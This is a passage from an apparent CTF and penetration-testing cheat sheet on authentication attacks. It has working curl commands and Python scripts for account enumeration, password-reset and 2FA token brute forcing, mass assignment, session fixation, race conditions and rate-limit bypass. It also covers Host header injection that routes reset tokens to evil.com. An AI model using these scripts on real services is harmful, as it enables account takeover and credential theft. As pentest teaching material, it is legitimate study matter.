[Inference] Password reset tokens in URL might leak via Referer header if page loads external resources.

# Example vulnerable flow:
1. User clicks: http://target.ctf/reset?token=secret123
2. Page loads: <img src="http://external.com/image.jpg">
3. Browser sends: Referer: http://target.ctf/reset?token=secret123

# Check for external resources on reset page
curl http://target.ctf/reset?token=test | grep -E "(src=|href=).*http"
```

**No Token Validation:**

```bash
# Request password reset
curl -d "email=victim@target.com" http://target.ctf/reset_password

# Try submitting new password without valid token
curl -d "email=victim@target.com&new_password=hacked123&token=" \
     http://target.ctf/reset_password_confirm

curl -d "email=victim@target.com&new_password=hacked123" \
     http://target.ctf/reset_password_confirm

# Or try using any random token
curl -d "email=victim@target.com&new_password=hacked123&token=invalid" \
     http://target.ctf/reset_password_confirm
```

### Mass Assignment Vulnerabilities

**User Registration with Role Assignment:**

```bash
# Normal registration
curl -d "username=test&password=test123&email=test@test.com" \
     http://target.ctf/register

# Try adding admin parameters
curl -d "username=test&password=test123&email=test@test.com&role=admin" \
     http://target.ctf/register

curl -d "username=test&password=test123&email=test@test.com&isAdmin=true" \
     http://target.ctf/register

curl -d "username=test&password=test123&email=test@test.com&admin=1" \
     http://target.ctf/register
```

**Common Mass Assignment Parameters:**

```bash
# Try these parameters during registration/profile update:
role=admin
isAdmin=true
admin=1
privilege=admin
account_type=admin
user_level=999
is_superuser=true
permissions[]=admin
groups[]=administrators
access_level=5
```

**Burp Suite Param Miner:**

```
1. Install Param Miner extension
2. Right-click request → Extensions → Param Miner → Guess params
3. Analyzes successful requests for hidden parameters
4. Tests discovered parameters with malicious values
```

### Backup/Temporary File Exposure

**Common Backup Authentication Files:**

```bash
# Test for backup files
curl http://target.ctf/login.php.bak
curl http://target.ctf/login.php~
curl http://target.ctf/login.php.old
curl http://target.ctf/login.php.backup
curl http://target.ctf/.login.php.swp
curl http://target.ctf/login.php.save
curl http://target.ctf/auth.php.bak
curl http://target.ctf/config.php.bak
curl http://target.ctf/db.php.bak

# Editor temporary files
curl http://target.ctf/.login.php.swp
curl http://target.ctf/.login.php.swo
curl http://target.ctf/login.php~
curl http://target.ctf/#login.php#

# Version control exposure
curl http://target.ctf/.git/config
curl http://target.ctf/.svn/entries

# If .git exposed, dump repository
git-dumper http://target.ctf/.git dumped_repo
```

**Automated Backup File Scanning:**

```bash
# Using ffuf
ffuf -u http://target.ctf/FUZZ -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt

# Using dirsearch
dirsearch -u http://target.ctf -e php,bak,old,backup,swp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Session Prediction/Hijacking

**Session Token Analysis:**

```python
#!/usr/bin/env python3
import requests
import hashlib

# Collect multiple session tokens
tokens = []
for i in range(10):
    r = requests.get("http://target.ctf/login")
    cookie = r.cookies.get('SESSIONID')
    tokens.append(cookie)
    print(f"Token {i+1}: {cookie}")

# Analyze for patterns
# - Sequential?
# - MD5/SHA hash of predictable value?
# - Timestamp-based?
# - Weak random number generator?
```

**Session Token Entropy Analysis:**

```bash
# Collect tokens
for i in {1..100}; do
    curl -i http://target.ctf/login 2>/dev/null | grep "Set-Cookie" | cut -d'=' -f2 | cut -d';' -f1 >> tokens.txt
done

# Analyze with Burp Sequencer
# 1. Capture request that generates session token
# 2. Send to Sequencer
# 3. Start live capture
# 4. Analyze results for entropy
```

**Session Fixation via Cookie Injection:**

```bash
# Set session before authentication
curl -b "PHPSESSID=attacker_controlled_id" \
     -d "username=victim&password=victimpass" \
     http://target.ctf/login

# If session persists after login, attacker can use it
curl -b "PHPSESSID=attacker_controlled_id" \
     http://target.ctf/dashboard
```

### Insecure Direct Object Reference (IDOR) in Auth

**Account Enumeration via IDOR:**

```bash
# Password reset by user ID
curl -d "user_id=1&new_password=hacked123" http://target.ctf/reset_password
curl -d "user_id=2&new_password=hacked123" http://target.ctf/reset_password

# Account activation by ID
curl http://target.ctf/activate?user_id=1
curl http://target.ctf/activate?user_id=2

# Email verification bypass
curl http://target.ctf/verify_email?user_id=1&code=123456
curl http://target.ctf/verify_email?user_id=2&code=123456
```

**Fuzzing User IDs:**

```bash
# Using wfuzz
wfuzz -z range,1-1000 http://target.ctf/reset_password?user_id=FUZZ

# Using ffuf
ffuf -u http://target.ctf/reset_password?user_id=FUZZ -w <(seq 1 1000)

# Python script
for uid in range(1, 1001):
    r = requests.post("http://target.ctf/reset_password", 
                      data={"user_id": uid, "new_password": "hacked"})
    if r.status_code == 200:
        print(f"[+] Successfully reset user ID: {uid}")
```


**Critical Related Topics:**

- **HTTP Parameter Pollution (HPP)**: Deep manipulation of duplicate parameters across different server technologies
- **Type Juggling (PHP)**: Exploiting loose comparison operators for authentication bypass
- **GraphQL Authentication Flaws**: Introspection queries, mutation abuse, and authorization bypass in GraphQL endpoints
- **SAML Vulnerabilities**: XML signature wrapping, assertion replay, and SAML message manipulation
- **API Authentication**: JWT deep-dive, API key leakage, OAuth 2.0 flow manipulation, and bearer token vulnerabilities
- **Rate Limiting Bypass**: Advanced techniques including distributed attacks, IP rotation, and header manipulation
- **Captcha Bypass**: OCR techniques, token reuse, response manipulation, and third-party solving services

---

## Account Enumeration

Account enumeration identifies valid usernames, email addresses, or account identifiers by observing application responses. This reconnaissance enables targeted attacks and credential stuffing.

### Detection Vectors

**Response Timing Differences:**

```bash
# Valid user may trigger database lookup (slower)
time curl -X POST http://target.com/login -d "user=admin&pass=wrong"
# Response: 1.2s

# Invalid user fails immediately (faster)
time curl -X POST http://target.com/login -d "user=nonexistent&pass=wrong"
# Response: 0.1s
```

**Error Message Variations:**

```bash
# Valid username
"Invalid password for user 'admin'"
"Password incorrect"

# Invalid username
"User not found"
"Invalid username or password"  # Inconsistent messaging
```

**HTTP Status Code Differences:**

```bash
# Valid user
POST /login → 401 Unauthorized

# Invalid user
POST /login → 404 Not Found
```

**Registration Form Responses:**

```bash
# Check if username exists
POST /register
{"username": "admin", "email": "test@test.com", "password": "pass123"}

Response: "Username already taken"
Response: "Email already registered"
```

**Password Reset Behavior:**

```bash
# Valid email
POST /reset-password
{"email": "admin@target.com"}
Response: "Reset link sent" (email actually sent)

# Invalid email
POST /reset-password
{"email": "fake@target.com"}
Response: "Reset link sent" (no email sent, timing difference)
```

**Login Attempt Rate Limiting:**

```bash
# Valid user triggers rate limiting after N attempts
# Invalid user may not trigger same limits
```

### Tools & Commands

**Burp Suite Intruder:**

```
1. Capture login request
2. Send to Intruder
3. Position markers: §username§
4. Payloads: username list
5. Analyze responses:
   - Length differences
   - Status codes
   - Response times
   - Grep patterns for error messages
```

**Python Enumeration Script:**

```python
#!/usr/bin/env python3
import requests
import time

def enumerate_users(url, username_list):
    """
    Enumerate valid usernames based on response differences
    """
    valid_users = []
    
    for username in username_list:
        start = time.time()
        response = requests.post(url, data={
            'username': username,
            'password': 'InvalidPassword123!'
        })
        elapsed = time.time() - start
        
        # Check multiple indicators
        if response.status_code == 401:  # May indicate valid user
            valid_users.append({
                'username': username,
                'status': response.status_code,
                'time': elapsed,
                'length': len(response.text)
            })
        
        time.sleep(0.5)  # Rate limiting
    
    return valid_users

# Usage
users = ['admin', 'root', 'user', 'test']
results = enumerate_users('http://target.com/login', users)
for r in results:
    print(f"Possible valid user: {r['username']} (time: {r['time']:.2f}s)")
```

**FFUF (Fuzzer):**

```bash
# Username enumeration via timing
ffuf -w usernames.txt -u http://target.com/login \
  -X POST -d "username=FUZZ&password=invalid" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc all -ft 1000-2000  # Filter by response time

# Filter by response size
ffuf -w usernames.txt -u http://target.com/login \
  -X POST -d "username=FUZZ&password=invalid" \
  -fs 1234  # Filter out size 1234 (invalid user response)
```

**wfuzz:**

```bash
# Enumerate usernames with response code filtering
wfuzz -w users.txt -d "username=FUZZ&password=test" \
  --hc 404 http://target.com/login

# Time-based enumeration
wfuzz -w users.txt -d "username=FUZZ&password=test" \
  --filter "time>1" http://target.com/login
```

**Custom Timing Analysis:**

```bash
# Bash script for timing comparison
for user in admin root user test; do
  echo -n "$user: "
  time=$(curl -w "%{time_total}\n" -o /dev/null -s \
    -X POST http://target.com/login \
    -d "username=$user&password=wrong")
  echo "$time seconds"
done
```

### OAuth/SSO Enumeration

**Google OAuth:**

```bash
# Check if email is linked to Google account
https://accounts.google.com/o/oauth2/auth?client_id=CLIENT&redirect_uri=URI&scope=email&response_type=code&login_hint=target@email.com

# Response differences may reveal valid accounts
```

**Microsoft/Azure AD:**

```bash
# Enumerate valid organizational accounts
curl https://login.microsoftonline.com/common/GetCredentialType \
  -H "Content-Type: application/json" \
  -d '{"Username":"user@targetorg.com"}'

# Response contains "IfExistsResult": 0 (exists) or 1 (not exists)
```

### Exploitation Strategy

1. **Collect Username Patterns:**
    
    - Common formats: firstname.lastname, flastname, first.last
    - Use LinkedIn, OSINT for employee names
    - Try default accounts: admin, root, administrator
2. **Identify Response Indicators:**
    
    - Timing differences (>100ms significant)
    - Error message variations
    - HTTP status codes
    - Response body lengths
    - Cookie/session token behavior
3. **Automate & Filter:**
    
    - Use wordlists (SecLists: `/usr/share/seclists/Usernames/`)
    - Filter false positives
    - Verify findings manually
4. **Proceed to Credential Attacks:**
    
    - Password spraying with validated usernames
    - Targeted brute force
    - Credential stuffing from breaches

---

## Password Reset Flaws

Password reset mechanisms often contain vulnerabilities allowing account takeover through token manipulation, prediction, or process bypass.

### Common Vulnerabilities

**Token Prediction:**

```bash
# Weak token generation
# Sequential: abc123, abc124, abc125
# Timestamp-based: MD5(email+timestamp)
# Short tokens: 4-6 digits

# Request multiple resets, analyze pattern
curl -X POST http://target.com/reset -d "email=victim@test.com"
# Token: 123456

curl -X POST http://target.com/reset -d "email=attacker@test.com"
# Token: 123457

# Predict victim's next token
```

**Token Reuse:**

```bash
# Test if token can be used multiple times
1. Request reset for victim@test.com
2. Intercept token (if accessible)
3. Use token to reset password
4. Check if same token works again
```

**Token Leakage:**

```bash
# Token in URL (Referer header leakage)
http://target.com/reset-password?token=abc123xyz

# Check:
- HTTP history (if site links to third-party resources)
- Server logs
- Referer header to external sites
```

**Host Header Injection:**

```bash
# Manipulate password reset email link
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# If application uses Host header for reset link:
# Email contains: http://evil.com/reset?token=SECRET
# Token sent to attacker's server
```

**Parameter Pollution:**

```bash
# Send multiple email parameters
POST /reset-password
email=victim@target.com&email=attacker@test.com

# Possible outcomes:
# - Reset link sent to both emails
# - Token generated for victim but sent to attacker
# - Second email overrides first in email field but not token generation
```

**Token Not Invalidated:**

```bash
# Exploit flow:
1. User requests password reset
2. User completes reset (token should expire)
3. Attacker obtains old token
4. Old token still works despite password change

# Test:
- Request reset
- Complete process
- Attempt to reuse token
```

**No Rate Limiting:**

```bash
# Brute force short/weak tokens
for i in {000000..999999}; do
  curl -X POST http://target.com/reset-confirm \
    -d "email=victim@test.com&token=$i&new_password=hacked123"
done
```

**Username/Email Confusion:**

```bash
# Reset initiated with email
POST /reset-password
{"email": "victim@test.com"}

# But verification uses username parameter
POST /reset-confirm
{"username": "attacker", "token": "VICTIM_TOKEN", "new_password": "hacked"}

# If token isn't tied to username, attacker changes their own password with victim's token
```

### Tools & Commands

**Burp Suite Techniques:**

**Intercept & Modify Reset Request:**

```
1. Capture POST /reset-password
2. Modify response or subsequent requests
3. Test parameter manipulation:
   - email=victim@test.com → email=attacker@test.com
   - Add second email parameter
   - Change Host header
```

**Token Analysis:**

```
1. Request multiple resets
2. Collect tokens
3. Decoder tab: analyze encoding (Base64, Hex, etc.)
4. Look for patterns: timestamps, userIDs, sequential numbers
```

**Python Token Analysis:**

```python
#!/usr/bin/env python3
import requests
import hashlib
from datetime import datetime
import time

def analyze_tokens(url, email, iterations=10):
    """
    Request multiple reset tokens and analyze for patterns
    """
    tokens = []
    
    for i in range(iterations):
        response = requests.post(url, data={'email': email})
        # Extract token from response or email
        token = extract_token(response)  # Implement based on application
        tokens.append({
            'token': token,
            'timestamp': time.time(),
            'iteration': i
        })
        time.sleep(1)
    
    # Analyze patterns
    print("[*] Checking for sequential patterns...")
    for i in range(len(tokens)-1):
        try:
            diff = int(tokens[i+1]['token']) - int(tokens[i]['token'])
            print(f"Token difference: {diff}")
        except:
            pass
    
    # Check if tokens are hashes
    print("\n[*] Checking hash patterns...")
    for t in tokens:
        # Try common hash patterns
        test_md5 = hashlib.md5(email.encode()).hexdigest()
        test_timestamp = hashlib.md5(f"{email}{int(t['timestamp'])}".encode()).hexdigest()
        if t['token'] == test_md5[:len(t['token'])]:
            print(f"[!] Token may be MD5(email) truncated")
        if test_timestamp.startswith(t['token']):
            print(f"[!] Token may be MD5(email+timestamp)")
    
    return tokens
```

**Host Header Injection Test:**

```bash
# Using curl
curl -X POST http://target.com/reset-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@target.com"

# Check attacker's server logs for incoming request with token
```

**Automated Brute Force:**

```python
#!/usr/bin/env python3
import requests
import concurrent.futures

def try_token(token, email, url):
    """
    Attempt to use a reset token
    """
    response = requests.post(url, data={
        'email': email,
        'token': token,
        'new_password': 'hacked123!'
    })
    
    if response.status_code == 200 or "success" in response.text.lower():
        print(f"[+] Valid token found: {token}")
        return token
    return None

def brute_force_token(email, url, token_length=6):
    """
    Brute force numeric reset tokens
    """
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        tokens = [str(i).zfill(token_length) for i in range(10**token_length)]
        futures = [executor.submit(try_token, t, email, url) for t in tokens]
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                return result

# Use with caution - only in authorized testing
```

### Exploitation Scenarios

**Scenario 1: Token in Referer**

```
1. Victim requests reset: http://target.com/reset?token=SECRET
2. Victim clicks link in email
3. Target site loads external resource: <img src="http://evil.com/track.gif">
4. Attacker's server logs Referer: http://target.com/reset?token=SECRET
5. Attacker uses token to reset password
```

**Scenario 2: Race Condition**

```python
# Exploit: use token before it's consumed
import requests
from concurrent.futures import ThreadPoolExecutor

def use_token(token):
    return requests.post('http://target.com/reset-confirm', 
                        data={'token': token, 'password': 'hacked'})

# Send multiple simultaneous requests
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(use_token, 'VALID_TOKEN') for _ in range(20)]
    
# If no proper locking, multiple requests may succeed
```

**Scenario 3: Account Takeover via IDOR**

```bash
# Request reset for your account
POST /reset-password
{"email": "attacker@test.com"}

# Receive token: abc123xyz

# Use token with victim's email
POST /reset-confirm
{"email": "victim@target.com", "token": "abc123xyz", "password": "hacked"}

# If token validation doesn't check email association
```

---

## Verification Email Bypass

Email verification ensures legitimate account registration. Bypassing this control allows attackers to create accounts without valid email access.

### Common Bypass Methods

**Direct Access Without Verification:**

```bash
# Register account
POST /register
{"email": "test@test.com", "username": "testuser", "password": "pass123"}

# Account created but unverified
# Test: attempt to login immediately
POST /login
{"username": "testuser", "password": "pass123"}

# If successful, verification bypassed
```

**Token Prediction:**

```bash
# Similar to password reset
# Analyze verification tokens for patterns
1. Register multiple accounts
2. Capture verification tokens
3. Identify pattern (sequential, timestamp-based, etc.)
4. Predict victim's verification token
```

**Token in Response:**

```bash
# Registration response may leak verification token
POST /register
{"email": "test@test.com", "username": "testuser", "password": "pass123"}

Response:
{
  "status": "success",
  "message": "Check your email",
  "verification_token": "abc123xyz"  # Leaked in response
}

# Use token directly
GET /verify?token=abc123xyz
```

**Email Parameter Manipulation:**

```bash
# Register with victim's email
POST /register
{"email": "victim@target.com", "username": "attacker", "password": "pass123"}

# Intercept verification request
GET /verify?email=victim@target.com&token=TOKEN

# Modify to attacker's email
GET /verify?email=attacker@test.com&token=TOKEN

# If validation doesn't check email-token binding
```

**Reuse Verification Link:**

```bash
# Verify your own account
GET /verify?token=YOUR_TOKEN

# Attempt to reuse token with different user identifier
GET /verify?token=YOUR_TOKEN&user_id=VICTIM_ID
GET /verify?token=YOUR_TOKEN&username=victim
```

**Race Condition:**

```python
# Exploit verification check timing
import requests
from concurrent.futures import ThreadPoolExecutor

def login_attempt():
    return requests.post('http://target.com/login',
                        data={'username': 'unverified', 'password': 'pass123'})

def verify_account():
    return requests.get('http://target.com/verify?token=TOKEN')

# Simultaneously attempt login and verification
with ThreadPoolExecutor(max_workers=2) as executor:
    future1 = executor.submit(login_attempt)
    future2 = executor.submit(verify_account)
    
    result1 = future1.result()
    result2 = future2.result()

# Check if race condition allowed unverified login
```

**Response Manipulation:**

```bash
# Server checks verification status and returns JSON
POST /login
{"username": "unverified", "password": "pass123"}

Response:
{"status": "error", "message": "Email not verified", "verified": false}

# Intercept and modify response in Burp
{"status": "success", "message": "Login successful", "verified": true}

# If client-side check only, bypass successful
```

### Tools & Commands

**Burp Suite Match & Replace:**

```
1. Proxy → Options → Match and Replace
2. Add rule:
   Type: Response body
   Match: "verified":false
   Replace: "verified":true
3. Intercept responses and auto-modify
```

**Python Registration & Token Extraction:**

```python
#!/usr/bin/env python3
import requests
import re
import time

def register_and_extract_token(url, email, username, password):
    """
    Register account and extract verification token from response
    """
    # Register
    response = requests.post(f"{url}/register", data={
        'email': email,
        'username': username,
        'password': password
    })
    
    # Check if token in response
    token_pattern = r'verification[_-]?token["\s:]+([a-zA-Z0-9]+)'
    match = re.search(token_pattern, response.text)
    
    if match:
        token = match.group(1)
        print(f"[+] Token leaked in response: {token}")
        return token
    
    # Check if token in URL within response
    url_pattern = r'verify\?token=([a-zA-Z0-9]+)'
    match = re.search(url_pattern, response.text)
    
    if match:
        token = match.group(1)
        print(f"[+] Token found in URL: {token}")
        return token
    
    print("[-] Token not found in response")
    return None

def verify_account(url, token):
    """
    Attempt to verify account using token
    """
    response = requests.get(f"{url}/verify?token={token}")
    if response.status_code == 200:
        print("[+] Account verified successfully")
        return True
    return False
```

**Email Interception (Testing Environment):**

```bash
# For CTF environments with accessible mail server
# Check if you can access mail logs or temporary email services

# MailHog (common in CTF)
curl http://target.com:8025/api/v2/messages

# Parse for verification links
curl http://target.com:8025/api/v2/messages | \
  jq -r '.[].Content.Headers.Subject'
```

**Token Brute Force:**

```python
#!/usr/bin/env python3
import requests
import itertools
import string

def brute_force_verification(url, username, token_length=6):
    """
    Brute force short verification tokens
    """
    chars = string.ascii_letters + string.digits
    
    for combo in itertools.product(chars, repeat=token_length):
        token = ''.join(combo)
        response = requests.get(f"{url}/verify", params={
            'username': username,
            'token': token
        })
        
        if "success" in response.text.lower() or response.status_code == 200:
            print(f"[+] Valid token: {token}")
            return token
        
        if int(''.join(combo)) % 1000 == 0:
            print(f"[*] Progress: {token}")
    
    return None

# [Inference] This may be practical only for very short tokens (4-6 chars)
```

### Exploitation Strategy

1. **Map Verification Flow:**
    
    - Registration endpoint
    - Verification endpoint
    - Token format and delivery method
    - Client vs server-side validation
2. **Test Token Properties:**
    
    - Length and character set
    - Predictability
    - Expiration
    - Reusability
    - Association with user identifier
3. **Identify Bypass Opportunities:**
    
    - Missing server-side validation
    - Token leakage
    - Parameter manipulation
    - Race conditions
    - IDOR in verification process
4. **Exploit:**
    
    - Direct access if no enforcement
    - Token manipulation if predictable
    - Response manipulation if client-side check
    - Email parameter swap if weak binding

---

## Two-Factor Authentication Bypass

2FA adds security through additional verification factors. Bypassing 2FA enables account access with only password knowledge.

### Attack Vectors

**Missing 2FA Enforcement:**

```bash
# Complete login flow
POST /login
{"username": "victim", "password": "KNOWN_PASSWORD"}

Response: {"status": "2fa_required", "redirect": "/2fa-verify"}

# Instead of following redirect, access protected resource directly
GET /dashboard
GET /api/user/profile

# If 2FA not enforced on all endpoints
```

**Backup Code Enumeration:**

```bash
# Backup codes often have predictable format
# Example: 8-digit numeric codes

# Brute force backup codes
for code in {00000000..99999999}; do
  curl -X POST http://target.com/2fa-verify \
    -d "username=victim&backup_code=$code" \
    -b "session=VICTIM_SESSION"
done

# More realistic: 6-8 digit codes with rate limiting bypass
```

**Response Manipulation:**

```bash
# Server returns 2FA status in response
POST /2fa-verify
{"username": "victim", "code": "wrong"}

Response:
{"status": "error", "2fa_valid": false, "message": "Invalid code"}

# Intercept and modify in Burp
{"status": "success", "2fa_valid": true, "message": "Login successful"}

# If client-side validation only
```

**Direct Request to Post-2FA Endpoint:**

```bash
# Workflow:
1. POST /login → Session cookie set
2. POST /2fa-verify → Session upgraded

# Attack: skip step 2
curl http://target.com/dashboard \
  -b "session=SESSION_FROM_STEP1"

# If session upgrade not properly enforced
```

**Code Reuse:**

```bash
# Test if 2FA codes can be used multiple times
1. Intercept valid 2FA code (through social engineering, etc.)
2. Use code to authenticate
3. Attempt to reuse same code for another session

# If no proper invalidation
```

**Rate Limiting Bypass:**

```bash
# Bypass rate limiting to brute force 2FA codes

# Method 1: IP rotation
for code in {000000..999999}; do
  curl -x http://proxy$((RANDOM%100)).com:8080 \
    -X POST http://target.com/2fa-verify \
    -d "code=$code"
done

# Method 2: Session/user variation
# Create multiple sessions, distribute attempts

# Method 3: Header manipulation
curl -H "X-Forwarded-For: 1.2.3.$((RANDOM%255))" \
  -X POST http://target.com/2fa-verify \
  -d "code=123456"
```

**Token/Session Manipulation:**

```bash
# Exploit session handling between login and 2FA

# Login as attacker
POST /login → session_id=ABC123

# Login as victim (with known password)
POST /login → session_id=XYZ789

# Complete 2FA with attacker's session
POST /2fa-verify
Cookie: session_id=ABC123
Data: username=victim&code=ATTACKER_2FA_CODE

# If username parameter overrides session binding
```

**OAuth/SSO 2FA Bypass:**

```bash
# Some OAuth implementations don't enforce 2FA

# Direct login: requires 2FA
POST /login → 2FA required

# OAuth login: may bypass 2FA
GET /oauth/login?provider=google
# Redirects to Google
# Returns to /oauth/callback
# Session created without 2FA

# Test all authentication methods
```

**Password Reset Bypass:**

```bash
# Password reset may not require 2FA

# Normal flow: Login → 2FA → Access
# Bypass: Reset password → Login → Access (no 2FA required)

# Test if newly reset passwords bypass 2FA temporarily
```

### Tools & Commands

**Burp Suite 2FA Testing:**

**Macro for Automated 2FA:**

```
1. Proxy → Options → Sessions → Macros
2. Add macro:
   - POST /login
   - POST /2fa-verify (with valid code from TOTP)
3. Use in Session Handling Rules
4. Test if automated 2FA completion works
```

**Intruder Brute Force:**

```
1. Capture POST /2fa-verify request
2. Send to Intruder
3. Position: §code§
4. Payloads: Numbers 000000-999999
5. Resource Pool: Throttle to bypass rate limiting
6. Grep - Match: Success indicators
```

**Python TOTP Brute Force:**

```python
#!/usr/bin/env python3
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def try_2fa_code(session, code, url):
    """
    Attempt 2FA code
    """
    response = requests.post(url, 
                           cookies={'session': session},
                           data={'code': code})
    
    if response.status_code == 200 or "success" in response.text.lower():
        print(f"[+] Valid code: {code}")
        return code
    return None

def brute_force_2fa(session, url, start=0, end=999999):
    """
    Brute force 6-digit 2FA codes
    [Inference] Practical only if rate limiting weak or absent
    """
    with ThreadPoolExecutor(max_workers=10) as executor:
        codes = [str(i).zfill(6) for i in range(start, end + 1)]
        futures = [executor.submit(try_2fa_code, session, c, url) for c in codes]
        
        for future in futures:
            result = future.result()
            if result:
                return result

# Time-based attack (if TOTP with clock skew tolerance)
def totp_window_attack(session, url, window_minutes=5):
    """
    Try TOTP codes within time window
    """
    import pyotp
    
    # If you know the secret (leaked, social engineering, etc.)
    # Or trying default secrets (testing environments)
    secrets = ['JBSWY3DPEHPK3PXP']  # Example
    
    for secret in secrets:
        totp = pyotp.TOTP(secret)
        # Try current and nearby time windows
        for offset in range(-window_minutes, window_minutes + 1):
            timestamp = int(time.time()) + (offset * 30)
            code = totp.at(timestamp)
            
            if try_2fa_code(session, code, url):
                return code
```

**Rate Limiting Bypass Techniques:**

**IP Rotation:**

```python
import requests
import random

proxies = [
    'http://proxy1.com:8080',
    'http://proxy2.com:8080',
    # ... more proxies
]

def bypass_rate_limit(url, code):
    proxy = {'http': random.choice(proxies)}
    return requests.post(url, data={'code': code}, proxies=proxy)
```

**Header Manipulation:**

```python
headers = {
    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
    'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
}
```

**Session Variation:**

```python
# Create multiple sessions to distribute attempts
sessions = []
for i in range(10):
    response = requests.post('http://target.com/login',
                           data={'username': f'test{i}', 'password': 'pass'})
    sessions.append(response.cookies.get('session'))

# Rotate through sessions for brute force
```

### Real-World Bypass Examples

**Remember Me Token:**

```bash
# Some applications use "remember me" tokens that bypass 2FA

# Login with 2FA once
POST /login → 2FA → Set remember_token cookie

# Later, use remember_token to bypass 2FA
GET /dashboard
Cookie: remember_token=ABC123XYZ

# Test if remember_token allows session creation without 2FA
```

**API Endpoints:**

```bash
# Web interface: enforces 2FA
POST /login (web) → requires 2FA

# API: may not enforce 2FA
POST /api/v1/auth (API) → returns access_token without 2FA

# Test all authentication interfaces
```

**CSRF/Click jacking During 2FA:**

```html
<!-- Attacker creates malicious page -->
<iframe src="http://target.com/2fa-verify"></iframe>
<script>
// If user already authenticated (step 1 complete)
// And 2FA form lacks CSRF protection
// Submit form automatically with predicted/brute forced code
</script>
```

### TOTP-Specific Attacks

**Time Synchronization Issues:**

```python
# TOTP allows time window (usually ±1 interval, 30s each)
# If wider window, more codes are valid simultaneously

import pyotp
import time

def generate_totp_window(secret, window=2):
    """
    Generate valid codes within time window
    window: number of 30s intervals before/after current
    """
    totp = pyotp.TOTP(secret)
    current_time = int(time.time())
    codes = []
    
    for offset in range(-window, window + 1):
        timestamp = current_time + (offset * 30)
        code = totp.at(timestamp)
        codes.append(code)
    
    return codes

# If secret known or guessed, generate valid codes
```

**QR Code Interception:**

```bash
# During 2FA setup, QR code displayed
# If attacker can view (shoulder surfing, screen sharing, etc.)
# Extract secret from QR code

# QR codes contain: otpauth://totp/ISSUER:USER?secret=SECRET&issuer=ISSUER

# Tools to parse QR:
zbarimg qrcode.png
# Outputs: otpauth://totp/...

# Extract secret, generate codes:
echo "SECRET" | base32 -d | xxd
```

### Exploitation Strategy

1. **Enumerate 2FA Implementation:**
    - Code length (6-8 digits common)
    - Code type (TOTP, SMS, email)
    - Backup code availability
    - Rate limiting strength
    - Session handling between authentication steps
2. **Test Enforcement:**
    - Try accessing protected resources after step 1 (login) only
    - Test all endpoints (web, API, mobile)
    - Check OAuth/SSO flows
    - Test password reset flow
3. **Identify Weaknesses:**
    - Predictable backup codes
    - Reusable 2FA codes
    - Weak rate limiting
	- Client-side validation only
    - Missing CSRF protection on 2FA form
    - Session fixation vulnerabilities
    - Response manipulation possibilities

4. **Exploit Based on Weakness:**
    - Brute force if rate limiting weak
    - Response manipulation if client-side check
    - Direct access if enforcement missing
    - Backup code enumeration if available
    - Session manipulation if binding weak

---

### SMS-Based 2FA Attacks

**SIM Swapping:**

```bash
# [Inference] Attack flow (social engineering component):
1. Attacker convinces carrier to port victim's number
2. Attacker receives SMS codes
3. Attacker completes 2FA

# Detection during testing:
- Check if account provides warnings for phone number changes
- Test if email notification sent when 2FA SMS requested
```

**SMS Interception (SS7 Attacks):**

```bash
# [Unverified] SS7 protocol vulnerabilities allow SMS interception
# Beyond scope of typical CTF but relevant to understand weakness of SMS 2FA
# Requires access to SS7 network infrastructure
```

**Phishing/MITM:**

```bash
# Real-time phishing attack
1. Victim enters credentials on phishing site
2. Attacker uses credentials on real site
3. Real site requests 2FA code
4. Phishing site prompts victim for 2FA code
5. Victim enters code on phishing site
6. Attacker uses code on real site in real-time

# Detection: Check session timeout on 2FA codes
```

**Code Reuse Testing:**

```python
#!/usr/bin/env python3
import requests
import time

def test_sms_code_reuse(url, session, code):
    """
    Test if SMS code can be reused
    """
    # First use
    r1 = requests.post(url, 
                       cookies={'session': session},
                       data={'code': code})
    
    print(f"First attempt: {r1.status_code}")
    
    # Wait and try again
    time.sleep(2)
    
    # Second use
    r2 = requests.post(url,
                       cookies={'session': session},
                       data={'code': code})
    
    print(f"Second attempt: {r2.status_code}")
    
    if r2.status_code == 200:
        print("[!] Code can be reused - vulnerability detected")
        return True
    
    return False
```

---

### Email-Based 2FA Attacks

**Email Account Compromise:**

```bash
# If attacker has email access
# Direct access to 2FA codes

# Test for:
- Weak email password
- Email password reset flaws
- Email enumeration
```

**Link Parameter Manipulation:**

```bash
# Email contains verification link
http://target.com/verify-2fa?user_id=123&code=abc123xyz

# Test parameter manipulation
http://target.com/verify-2fa?user_id=456&code=abc123xyz

# If code not properly bound to user_id
```

**Race Condition in Email Delivery:**

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

def request_email_code(email):
    """Request 2FA code via email"""
    return requests.post('http://target.com/send-2fa-email',
                        data={'email': email})

def spam_email_requests(email, count=100):
    """
    Spam email code requests
    Test if:
    - Multiple valid codes generated
    - Email rate limiting
    - Server resource exhaustion
    """
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(request_email_code, email) 
                  for _ in range(count)]
        results = [f.result() for f in futures]
    
    return results

# [Inference] If multiple valid codes exist simultaneously, brute force becomes easier
```

---

### Biometric/Hardware Token Bypass

**Fallback Mechanisms:**

```bash
# Applications often have fallback when biometric fails
# Test fallback methods:
- SMS backup
- Email backup
- Security questions
- Backup codes

# Example flow:
1. Login requires biometric 2FA
2. Click "Can't use biometric?"
3. Fallback to SMS code
4. Exploit SMS 2FA weaknesses
```

**Device Binding Bypass:**

```bash
# Some 2FA tied to device ID/fingerprint

# Test device identifier manipulation
POST /2fa-verify
Headers:
  X-Device-ID: ATTACKER_DEVICE
  User-Agent: iPhone 12 Pro
Data:
  code=123456

# If device binding not properly enforced
```

---
